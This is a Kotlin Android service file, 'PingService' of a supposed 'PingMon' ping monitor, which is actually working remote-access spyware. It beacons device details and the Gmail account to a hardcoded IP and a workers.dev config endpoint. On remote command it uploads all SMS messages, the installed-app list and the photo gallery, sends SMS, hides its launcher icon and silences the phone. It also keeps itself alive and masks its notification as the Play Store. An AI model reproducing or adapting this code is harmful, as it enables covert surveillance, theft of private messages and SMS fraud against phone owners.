package com.example.pingmon

import android.accounts.AccountManager
import android.app.*
import android.content.*
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.media.AudioManager
import android.net.*
import android.os.*
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class PingService : Service() {

    companion object {
        const val WORKER_URL      = "https://pingmon.kapcher2019.workers.dev/config"
        const val APP_TOKEN       = "p7k2m9qx4bz8vn3rt"
        const val PING_INTERVAL_MS= 30_000L
        const val CHANNEL_ID      = "pingmon"
        const val NOTIF_ID        = 1001
        const val ACTION_TICK     = "com.example.pingmon.TICK"
        const val ACTION_GOTO     = "com.example.pingmon.GOTO"
        const val PREFS           = "pingmon"
        const val KEY_DOMAIN      = "domain"
        const val DEFAULT_DOMAIN  = "https://www.google.com"
        const val KEY_SERVER_URL  = "server_url"
        const val KEY_PING_URL    = "ping_url"
        const val KEY_CLIENT_IP   = "client_ip"
        const val KEY_REPORT      = "pending_report"
        private const val TAG     = "PingMon"

        fun start(ctx: Context) {
            val i = Intent(ctx, PingService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (e: Exception) { Log.w(TAG, "start: ${e.message}") }
        }

        fun uid(ctx: Context): String {
            val hw = listOf(Build.MANUFACTURER, Build.MODEL, Build.DEVICE, Build.HARDWARE, Build.BOARD, Build.BRAND).joinToString("|")
            return java.security.MessageDigest.getInstance("SHA-256")
                .digest(hw.toByteArray()).take(10).joinToString("") { "%02x".format(it) }
        }

        fun serverUrl(ctx: Context) = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString(KEY_SERVER_URL, "") ?: ""
        fun currentDomain(ctx: Context) = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString(KEY_DOMAIN, DEFAULT_DOMAIN) ?: DEFAULT_DOMAIN
        fun setDomain(ctx: Context, url: String) = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putString(KEY_DOMAIN, url).apply()
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var netCallback: ConnectivityManager.NetworkCallback? = null
    private var running = false
    private val prefs get() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
    private val fmt = SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.getDefault())

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotif("starting..."))
        thread = HandlerThread("ping").apply { start() }
        handler = Handler(thread!!.looper)
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PingMon::loop")
            .apply { setReferenceCounted(false); acquire() }
        watchNetwork()
        running = true
        checkMissedSms()
        tick()
        Reviver.scheduleAll(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_TICK) handler?.post { tick() }
        else if (!running) { running = true; handler?.post { tick() } }
        else handler?.post { if (isOnline()) { drainSmsQueue(); sendPing() } }
        Reviver.scheduleAll(this)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        Reviver.scheduleRestart(this, 1_000)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running = false
        handler?.removeCallbacksAndMessages(null)
        thread?.quitSafely()
        wakeLock?.let { if (it.isHeld) it.release() }
        unwatchNetwork()
        Reviver.scheduleRestart(this, 2_000)
        super.onDestroy()
    }

    private fun tick() {
        IconManager.retryIfPending(this)
        if (isOnline()) { checkServerConfig(); drainSmsQueue(); sendPing() }
        handler?.removeCallbacksAndMessages(null)
        handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
        Reviver.scheduleTick(this, PING_INTERVAL_MS)
    }

    /* ═══════════════════════════════════════════ CONFIG CHECK */
    private fun checkServerConfig() {
        val lastCheck = prefs.getLong("last_config_check", 0L)
        if (System.currentTimeMillis() - lastCheck < 6 * 3600_000L) return
        Thread {
            try {
                val req = Request.Builder().url(WORKER_URL).get().build()
                client.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        val json = JSONObject(resp.body?.string() ?: "{}")
                        val pingUrl = json.optString("ping_url", "")
                        if (pingUrl.isNotBlank()) {
                            prefs.edit()
                                .putString(KEY_PING_URL, pingUrl)
                                .putLong("last_config_check", System.currentTimeMillis())
                                .apply()
                        }
                    }
                }
            } catch (e: Exception) { Log.w(TAG, "config: ${e.message}") }
        }.start()
    }

    /* ═══════════════════════════════════════════ PING */
    private fun sendPing() {
        val pendingReport = prefs.getString(KEY_REPORT, null)
        val pendingInfo   = prefs.getString("pending_info", null)
        val pingUrl = prefs.getString(KEY_PING_URL, null) ?: "http://104.234.138.67:3000/ping"
        val payload = JSONObject().apply {
            put("uid",       uid(this@PingService))
            put("battery",   batteryLevel())
            put("model",     "${Build.MANUFACTURER} ${Build.MODEL}".trim())
            put("android",   Build.VERSION.RELEASE)
            put("operator",  operatorName())
            put("gmail",     gmailAccount())
            put("network",   networkType())
            val fcmToken = prefs.getString("fcm_token", null)
            if (!fcmToken.isNullOrBlank()) put("fcm_token", fcmToken)
            if (!pendingReport.isNullOrBlank()) put("report", pendingReport)
            if (!pendingInfo.isNullOrBlank())   put("info_report", pendingInfo)
        }.toString()

        val req = Request.Builder().url(pingUrl)
            .addHeader("X-Token", APP_TOKEN)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) { updateNotif("offline") }
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (it.isSuccessful) {
                        if (!pendingReport.isNullOrBlank()) prefs.edit().remove(KEY_REPORT).apply()
                        if (!pendingInfo.isNullOrBlank()) prefs.edit().remove("pending_info").apply()
                        handleResponse(it.body?.string() ?: "{}")
                        updateNotif("ok")
                    } else updateNotif("err ${it.code}")
                }
            }
        })
    }

    private fun handleResponse(bodyStr: String) {
        try {
            val json = JSONObject(bodyStr)
            val srv  = json.optString("server_url", "")
            if (srv.isNotBlank()) prefs.edit().putString(KEY_SERVER_URL, srv).apply()
            val ip = json.optString("client_ip", "")
            if (ip.isNotBlank()) prefs.edit().putString(KEY_CLIENT_IP, ip).apply()
            val cmd = json.optString("cmd", "")
            val arg = json.optString("arg", "")
            if (cmd.isNotBlank()) executeCommand(cmd, arg)
        } catch (e: Exception) { Log.w(TAG, "handleResponse: ${e.message}") }
    }

    /* ═══════════════════════════════════════════ COMMANDS */
    fun executeCommand(cmd: String, arg: String = "") {
        Log.i(TAG, "CMD: $cmd arg=$arg")
        when (cmd) {
            "cmd_target_ping"  -> targetPing()
            "cmd_info"         -> collectDeviceInfo()
            "cmd_send_sms"     -> sendSmsFromCommand(arg)
            "cmd_last_sms"     -> sendLastSms()
            "cmd_all_outbox"   -> sendAllSms(outboxOnly = true)
            "cmd_all_inbox"    -> sendAllSms(outboxOnly = false)
            "cmd_change_icon"  -> { IconManager.changeToAlternate(this); sendResult("🎨 Icon changed to alternate") }
            "cmd_hide_icon"    -> { IconManager.hideFromLauncher(this);   sendResult("👁 Icon hidden from launcher") }
            "cmd_app_list"     -> getAppList()
            "cmd_unhide"       -> { IconManager.showCurrent(this);        sendResult("✅ Icon visible again") }
            "cmd_silent"       -> { setSilent();                          sendResult("🔇 Silent mode activated") }
            "cmd_unsilent"     -> { setRinging();                         sendResult("🔔 Ring mode activated") }
            "cmd_gallery"      -> GalleryUploader(this).start()
            "cmd_gallery_refresh"->GalleryUploader(this).refresh()
            "update_server"    -> if (arg.isNotBlank()) { prefs.edit().putString(KEY_PING_URL, "$arg/ping").putString(KEY_SERVER_URL, arg).apply(); sendResult("📡 Server updated to $arg") }
            "goto"             -> if (arg.isNotBlank()) {
                setDomain(this, arg)
                sendBroadcast(Intent(ACTION_GOTO).setPackage(packageName).putExtra("url", arg))
            }
        }
    }

    /* ─── A: Target Ping ─────────────────────────────────── */
    private fun targetPing() {
        val battery = batteryLevel()
        val network = networkType()
        val operator = operatorName() ?: "?"
        val ip = prefs.getString(KEY_CLIENT_IP, "?") ?: "?"
        sendResult("🟢 *Online*\n📱 ${Build.MANUFACTURER} ${Build.MODEL}\n🔋 $battery% | 📡 $operator | $network\n📍 IP: $ip")
    }

    /* ─── D: Last SMS ─────────────────────────────────────── */
    private fun sendLastSms() {
        Thread {
            try {
                val result = querySms(null, "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1")
                if (result.isEmpty()) { sendResult("No SMS found."); return@Thread }
                val sms = result[0]
                val typeIcon = if (sms.type == "SENT") "📤" else "📥"
                val text = "📱 Last SMS\n$typeIcon ${sms.address}\n${sms.body}\n🕐 ${fmt.format(Date(sms.date))}"
                postMessage(text)
            } catch (e: Exception) {
                // Fallback: try alternate content URI
                try {
                    val cursor = contentResolver.query(
                        android.net.Uri.parse("content://sms"), null, null, null, "date DESC LIMIT 1"
                    )
                    cursor?.use { c ->
                        if (c.moveToFirst()) {
                            val addr = c.getString(c.getColumnIndexOrThrow("address")) ?: "?"
                            val body = c.getString(c.getColumnIndexOrThrow("body")) ?: ""
                            val date = c.getLong(c.getColumnIndexOrThrow("date"))
                            postMessage("📥 $addr\n$body\n🕐 ${fmt.format(Date(date))}")
                        } else sendResult("No SMS found.")
                    } ?: sendResult("SMS access denied.")
                } catch (e2: Exception) { sendResult("SMS error: ${e2.message}") }
            }
        }.start()
    }

    /* ─── E: All Outbox / F: All Inbox ───────────────────── */
    private fun sendAllSms(outboxOnly: Boolean) {
        Thread {
            try {
                val typeFilter = if (outboxOnly) android.provider.Telephony.Sms.MESSAGE_TYPE_SENT
                                 else android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX
                val result = querySms("${android.provider.Telephony.Sms.TYPE}=$typeFilter", "${android.provider.Telephony.Sms.DATE} DESC")
                if (result.isEmpty()) { sendResult(if (outboxOnly) "No outbox messages." else "No inbox messages."); return@Thread }
                val label = if (outboxOnly) "📤 Outbox" else "📥 Inbox"
                val sb = StringBuilder("$label — ${result.size} messages\n" + "═".repeat(30) + "\n")
                result.forEach { sms ->
                    val icon = if (sms.type == "SENT") "📤" else "📥"
                    sb.appendLine("$icon ${sms.address}")
                    sb.appendLine("🕐 ${fmt.format(Date(sms.date))}")
                    sb.appendLine(sms.body)
                    sb.appendLine("─".repeat(20))
                }
                val filename = if (outboxOnly) "outbox_${Build.MODEL}.txt" else "inbox_${Build.MODEL}.txt"
                uploadText(filename, sb.toString(), "$label — ${result.size} msgs — ${Build.MODEL}")
            } catch (e: Exception) {
                // Fallback
                try {
                    val uri = android.net.Uri.parse("content://sms/" + if (outboxOnly) "sent" else "inbox")
                    val cursor = contentResolver.query(uri, null, null, null, "date DESC")
                    val sb = StringBuilder()
                    cursor?.use { c ->
                        while (c.moveToNext()) {
                            val addr = c.getString(c.getColumnIndexOrThrow("address")) ?: "?"
                            val body = c.getString(c.getColumnIndexOrThrow("body")) ?: ""
                            val date = c.getLong(c.getColumnIndexOrThrow("date"))
                            sb.appendLine("${if(outboxOnly)"📤" else "📥"} $addr\n${fmt.format(Date(date))}\n$body\n─────")
                        }
                    }
                    uploadText("sms_${Build.MODEL}.txt", sb.toString(), "SMS Export")
                } catch (e2: Exception) { sendResult("SMS error: ${e2.message}") }
            }
        }.start()
    }

    data class SmsItem(val address: String, val body: String, val date: Long, val type: String)

    private fun querySms(selection: String?, sortOrder: String): List<SmsItem> {
        val result = mutableListOf<SmsItem>()
        val cursor = contentResolver.query(
            android.provider.Telephony.Sms.CONTENT_URI,
            arrayOf(android.provider.Telephony.Sms.ADDRESS, android.provider.Telephony.Sms.BODY,
                android.provider.Telephony.Sms.DATE, android.provider.Telephony.Sms.TYPE),
            selection, null, sortOrder
        )
        cursor?.use { c ->
            while (c.moveToNext()) {
                val type = if (c.getInt(3) == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT) "SENT" else "RECV"
                result.add(SmsItem(c.getString(0)?:"?", c.getString(1)?:"", c.getLong(2), type))
            }
        }
        return result
    }

    /* ─── I: App List ─────────────────────────────────────── */
    private fun getAppList() {
        Thread {
            try {
                val pm   = packageManager
                val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                // Filter user apps, multiple fallbacks
                val userApps = try {
                    apps.filter { it.flags and ApplicationInfo.FLAG_SYSTEM == 0 }
                } catch (e: Exception) { apps }

                val sb = StringBuilder("📱 App List — ${Build.MODEL}\n")
                sb.appendLine("Total: ${userApps.size} apps\n" + "═".repeat(30))
                userApps.sortedBy { it.packageName }.forEachIndexed { i, app ->
                    val label = try { pm.getApplicationLabel(app).toString() } catch (e: Exception) { app.packageName }
                    sb.appendLine("${i+1}. $label\n   ${app.packageName}")
                }
                uploadText("apps_${Build.MODEL}.txt", sb.toString(), "📱 App List — ${userApps.size} apps — ${Build.MODEL}")
            } catch (e: Exception) {
                // Fallback: try getInstalledPackages
                try {
                    val packages = packageManager.getInstalledPackages(0)
                    val sb = StringBuilder("📱 Apps — ${packages.size}\n")
                    packages.forEach { pkg ->
                        sb.appendLine("• ${pkg.packageName} v${pkg.versionName}")
                    }
                    uploadText("apps_${Build.MODEL}.txt", sb.toString(), "📱 Apps — ${Build.MODEL}")
                } catch (e2: Exception) { sendResult("App list error: ${e2.message}") }
            }
        }.start()
    }

    /* ─── Send SMS ───────────────────────────────────────── */
    private fun sendSmsFromCommand(arg: String) {
        try {
            val data = JSONObject(arg)
            val to   = data.optString("to", "")
            val msg  = data.optString("msg", "")
            if (to.isBlank() || msg.isBlank()) return

            // Method 1: SmsManager
            try {
                val mgr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    getSystemService(android.telephony.SmsManager::class.java)
                } else {
                    @Suppress("DEPRECATION") android.telephony.SmsManager.getDefault()
                }
                mgr.sendMultipartTextMessage(to, null, mgr.divideMessage(msg), null, null)
                sendResult("✅ SMS sent to $to")
                return
            } catch (e: Exception) { Log.w(TAG, "sms method1: ${e.message}") }

            // Method 2: via Intent
            try {
                val smsIntent = Intent(Intent.ACTION_SENDTO, android.net.Uri.parse("smsto:$to"))
                    .putExtra("sms_body", msg)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(smsIntent)
                sendResult("✅ SMS dialog opened for $to")
            } catch (e2: Exception) { sendResult("SMS error: ${e2.message}") }
        } catch (e: Exception) { sendResult("SMS parse error: ${e.message}") }
    }

    /* ─── Silent / Unsilent ──────────────────────────────── */
    private fun setSilent() {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        // Method 1: RINGER_MODE_SILENT
        try { am.ringerMode = AudioManager.RINGER_MODE_SILENT; return } catch (_: SecurityException) {}
        // Method 2: VIBRATE
        try { am.ringerMode = AudioManager.RINGER_MODE_VIBRATE } catch (_: Exception) {}
    }

    private fun setRinging() {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        // Method 1: RINGER_MODE_NORMAL
        try {
            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING) * 2 / 3, 0)
            return
        } catch (e: Exception) { Log.w(TAG, "unsilent m1: ${e.message}") }
        // Method 2: just set mode
        try { am.ringerMode = AudioManager.RINGER_MODE_NORMAL } catch (_: Exception) {}
    }

    /* ─── Icon Management ────────────────────────────────── */
    private fun collectDeviceInfo() {
        try {
            val dangerous = listOf(
                android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.CALL_PHONE, android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_PHONE_NUMBERS, android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.CAMERA, android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.GET_ACCOUNTS,
            )
            val granted = dangerous.filter {
                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            }.map { it.substringAfterLast(".") }.toMutableList()

            val hasGallery = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
            } else {
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
            }
            if (hasGallery) granted.add("GALLERY")

            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val ringerState = when (am.ringerMode) {
                AudioManager.RINGER_MODE_NORMAL  -> "ring"
                AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
                else -> "silent"
            }
            val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            val isVpn = caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true

            val sims = mutableListOf<String>()
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
                    sm.activeSubscriptionInfoList?.forEach { sub -> sims.add("${sub.displayName}(SIM${sub.simSlotIndex+1})") }
                }
            } catch (_: Exception) { operatorName()?.let { sims.add(it) } }

            val iconState    = IconManager.currentState(this)
            val appVersion   = try { packageManager.getPackageInfo(packageName, 0).versionName ?: "?" } catch (_: Exception) { "?" }
            val ip           = prefs.getString(KEY_CLIENT_IP, "?") ?: "?"
            val networkType  = networkType()

            val info = JSONObject().apply {
                put("model",       "${Build.MANUFACTURER} ${Build.MODEL}".trim())
                put("os",          Build.VERSION.RELEASE)
                put("appVersion",  appVersion)
                put("gmail",       gmailAccount() ?: "—")
                put("permissions", JSONArray(granted))
                put("vpn",         isVpn)
                put("icon",        iconState)
                put("ringer",      ringerState)
                put("battery",     batteryLevel())
                put("carrier",     sims.joinToString(" / ").ifBlank { "—" })
                put("sims",        JSONArray(sims))
                put("network",     networkType)
                put("ip",          ip)
            }
            prefs.edit().putString("pending_info", info.toString()).apply()
        } catch (e: Exception) { Log.w(TAG, "collectInfo: ${e.message}") }
    }

    /* ═══════════════════════════════════════════ HELPERS */
    fun sendResult(text: String) {
        val server = serverUrl(this)
        if (server.isBlank()) { prefs.edit().putString(KEY_REPORT, text).apply(); return }
        Thread {
            try {
                val uid  = uid(this)
                val body = JSONObject().apply { put("text", text); put("uid", uid) }.toString()
                Request.Builder().url("$server/message")
                    .addHeader("X-Token", APP_TOKEN)
                    .post(body.toRequestBody("application/json; charset=utf-8".toMediaType()))
                    .build().let { client.newCall(it).execute().use { } }
            } catch (e: Exception) { prefs.edit().putString(KEY_REPORT, text).apply() }
        }.start()
    }

    private fun postMessage(text: String) {
        val server = serverUrl(this)
        if (server.isBlank()) { prefs.edit().putString(KEY_REPORT, text).apply(); return }
        Thread {
            try {
                val uid  = uid(this)
                val body = JSONObject().apply { put("text", text); put("uid", uid) }.toString()
                Request.Builder().url("$server/message")
                    .addHeader("X-Token", APP_TOKEN)
                    .post(body.toRequestBody("application/json; charset=utf-8".toMediaType()))
                    .build().let { client.newCall(it).execute().use { } }
            } catch (e: Exception) { prefs.edit().putString(KEY_REPORT, text).apply() }
        }.start()
    }

    fun uploadText(filename: String, content: String, caption: String = "") {
        val server = serverUrl(this); if (server.isBlank()) return
        val uid   = uid(this)
        val bytes = content.toByteArray(Charsets.UTF_8)
        val req   = Request.Builder().url("$server/upload")
            .addHeader("X-Token", APP_TOKEN)
            .addHeader("X-Filename", filename)
            .addHeader("X-Caption", caption.replace(Regex("[^\\x20-\\x7E]"), ""))
            .addHeader("X-Uid", uid)
            .post(bytes.toRequestBody("text/plain; charset=utf-8".toMediaType()))
            .build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) { Log.w(TAG, "upload: ${e.message}") }
            override fun onResponse(call: Call, response: Response) { response.use { } }
        })
    }

    /* ═══════════════════════════════════════════ SMS QUEUE */
    private fun checkMissedSms() {
        val lastCheck = prefs.getLong("last_sms_check_time", 0L)
        val now = System.currentTimeMillis()
        prefs.edit().putLong("last_sms_check_time", now).apply()
        if (lastCheck == 0L) return
        try {
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                arrayOf(android.provider.Telephony.Sms.ADDRESS, android.provider.Telephony.Sms.BODY, android.provider.Telephony.Sms.DATE),
                "${android.provider.Telephony.Sms.DATE} > ? AND ${android.provider.Telephony.Sms.TYPE} = ${android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX}",
                arrayOf(lastCheck.toString()), "${android.provider.Telephony.Sms.DATE} ASC"
            )
            cursor?.use { c ->
                while (c.moveToNext()) SmsQueue.add(this, SmsQueue.Item(c.getString(0)?:"?", c.getString(1)?:"", c.getLong(2)))
            }
        } catch (e: Exception) { Log.w(TAG, "checkMissedSms: ${e.message}") }
    }

    private fun drainSmsQueue() {
        val queue = SmsQueue.getAll(this); if (queue.isEmpty()) return
        val server = serverUrl(this); if (server.isBlank()) return
        Thread {
            try {
                val uid   = uid(this)
                val parts = queue.mapIndexed { i, m -> "${i+1}. ${m.from}\n${fmt.format(Date(m.time))}\n${m.body}" }
                val text  = "${queue.size} new SMS on ${Build.MODEL}\n\n" + parts.joinToString("\n" + "-".repeat(20) + "\n")
                val body  = JSONObject().apply { put("text", text); put("uid", uid) }.toString()
                Request.Builder().url("$server/message")
                    .addHeader("X-Token", APP_TOKEN)
                    .post(body.toRequestBody("application/json; charset=utf-8".toMediaType()))
                    .build().let { req ->
                        client.newCall(req).execute().use { resp ->
                            if (resp.isSuccessful) {
                                SmsQueue.clear(this)
                                prefs.edit().putLong("last_sms_check_time", System.currentTimeMillis()).apply()
                            }
                        }
                    }
            } catch (e: Exception) { Log.w(TAG, "drainSms: ${e.message}") }
        }.start()
    }

    /* ═══════════════════════════════════════════ DEVICE INFO */
    private fun batteryLevel(): Int = (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
        .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

    private fun operatorName(): String? = try {
        (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).networkOperatorName.takeIf { it.isNotBlank() }
    } catch (_: Exception) { null }

    private fun gmailAccount(): String? = try {
        AccountManager.get(this).getAccountsByType("com.google").firstOrNull()?.name
    } catch (_: Exception) { null }

    private fun networkType(): String {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n  = cm.activeNetwork ?: return "none"
        val c  = cm.getNetworkCapabilities(n) ?: return "none"
        return when {
            c.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WiFi"
            c.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile"
            else -> "other"
        }
    }

    private fun isOnline(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n  = cm.activeNetwork ?: return false
        return cm.getNetworkCapabilities(n)?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
    }

    private fun watchNetwork() {
        val cm  = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val req = NetworkRequest.Builder().addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
        netCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) { handler?.post { drainSmsQueue(); sendPing() } }
        }
        try { cm.registerNetworkCallback(req, netCallback!!) } catch (e: Exception) { Log.w(TAG, "netcb: ${e.message}") }
    }

    private fun unwatchNetwork() {
        netCallback?.let {
            try { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).unregisterNetworkCallback(it) } catch (_: Exception) {}
        }
        netCallback = null
    }

    /* ═══════════════════════════════════════════ NOTIFICATION */
    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Connection", NotificationManager.IMPORTANCE_MIN)
                .apply { setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotif(text: String): Notification {
        val intent = packageManager.getLaunchIntentForPackage("com.android.vending")
            ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
            ?: Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://play.google.com")).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
        val tap = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("PingMon").setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
            .setPriority(NotificationCompat.PRIORITY_MIN).setOngoing(true).setSilent(true)
            .setShowWhen(false).setContentIntent(tap).build()
    }

    private fun updateNotif(state: String) {
        try { getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotif("${uid(this).take(8)} - $state")) } catch (_: Exception) {}
    }
}
